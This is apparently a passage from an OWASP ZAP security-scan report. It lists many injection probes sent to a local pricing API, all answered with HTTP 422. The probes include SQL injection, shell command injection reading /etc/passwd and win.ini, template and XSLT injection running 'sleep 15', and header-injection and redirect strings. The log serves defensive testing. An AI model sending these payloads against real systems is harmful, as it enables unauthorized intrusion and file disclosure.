  * Node Name: `http://backend:8000/pricing/calculate ()(";")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<%=%x(sleep 15)%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"document('http://backend:22')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"php:function('exec','erroneous_command 2>&amp;1')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:variable name=\"rtobject\" select=\"runtime:getRuntime()\"/>\n<xsl:variable name=\"process\" select=\"runtime:exec($rtobject,'erroneous_command')\"/>\n<xsl:variable name=\"waiting\" select=\"process:waitFor($process)\"/>\n<xsl:value-of select=\"$process\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("HjPWGgJdXtKVpLUxPVAUlKensIubWiVXGWBTWeqZrZbUaDOgQQRViSbgoNjmgDMeKDCFLNLtMbiTBUtbpRHCIOsgEcYtjDYpeMuyeMsZhrjIZKloxWrIdIQxRpWioVMHvysDBbAJkcLiHXjZuAIgWNRkhBDAVNksgtLkKKUEJimTfbCrxOyjbFyyALyuNZKFuGWXfyifUcedCetIcNraGbwvhseehtnJFGWKOiMynJcReUkPOPdQXLMQPSQhFUaTtsdxpqvBjSHUOnUrgeXwermlVePbhJvwPcmemRKTmmTikXpfUggiotHnifNcIVAvolBaHvCyNtGfQkiwTAJyPutBtcQheBoDbRniCIgPphtobHYvmFGNLLVeDJMSbVrMIFaxJaJYwgZPxhhLCEJRtNeoOShhguvvSScdQdlHwBVItBXJGBlFZgWsIXEqcTEfROfEaXpSeAyrbLKaLwNNjCKxeCvKryrgNSeABZUZrRRiBNMMifWRaiXWckxhFZk)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe AND 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe AND 1=2 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe OR 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe&cat /etc/passwd&")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' AND '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' AND '1'='2' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' OR '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'&cat /etc/passwd&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'&type %SYSTEMROOT%\\win.ini&'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe') UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe';cat /etc/passwd;'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe';get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe'|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe) UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;cat /etc/passwd;")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;get-help #")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe;get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\" UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"&cat /etc/passwd&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"&type %SYSTEMROOT%\\win.ini&\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\";cat /etc/passwd;\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\";get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe\"|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe|type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("Set-cookie: Tamper=223761f9-75c8-4e63-a954-43848974cc17")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("URL='http://6292097205271444573.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"+response.write(916,407*559,232)+\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"/><xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var=\"")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"><!--#EXEC cmd=\"dir \\\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("\"><!--#EXEC cmd=\"ls /\"--><")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("]]>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any?\nSet-cookie: Tamper=223761f9-75c8-4e63-a954-43848974cc17")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any?\r\nSet-cookie: Tamper=223761f9-75c8-4e63-a954-43848974cc17")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any?\r\nSet-cookie: Tamper=223761f9-75c8-4e63-a954-43848974cc17\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any\nSet-cookie: Tamper=223761f9-75c8-4e63-a954-43848974cc17")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any\r\nSet-cookie: Tamper=223761f9-75c8-4e63-a954-43848974cc17")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("any\r\nSet-cookie: Tamper=223761f9-75c8-4e63-a954-43848974cc17\r\n")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("cat /etc/passwd")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("get-help")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://\\6292097205271444573.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("http://www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://6292097205271444573%2eowasp%2eorg")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://6292097205271444573.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://6292097205271444573.owasp.org/?John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("https://\\6292097205271444573.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("response.write(916,407*559,232)")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("system-property('xsl:vendor')/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com:80/")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("www.google.com:80/search?q=ZAP")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj 3649*2493 zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj#set($x=2975*2462)${x}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj#{3614*9872}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj${8659*4456}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj<%=3770*3594%>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj<p th:text=\"${3461*7476}\"></p>zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{#2889*8716}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{6184*6137}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{@1727*1392}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{@math key=\"5745\" method=\"multiply\" operand=\"9310\"/}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{5082*4037}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{80690|add:70900}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{=5608*5495}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("zj{{print \"9319\" \"5777\"}}zj")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{system(\"sleep 15\")}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"sleep 15\")}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\\\")\")()}}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate/
  * Node Name: `http://backend:8000/pricing/calculate/ ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"sleep 15\"))\n#set($null=$proc.waitFor())\n${null}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("#{%x(sleep 15)}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("${__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("'(")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("+response.write({0}*{1})+")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("5;URL='https://6292097205271444573.owasp.org'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("5;URL='https://6292097205271444573.owasp.org/?John Doe'")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()("6292097205271444573.owasp.org")`
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/rules
  * Node Name: `http://backend:8000/pricing/rules ()(";")`
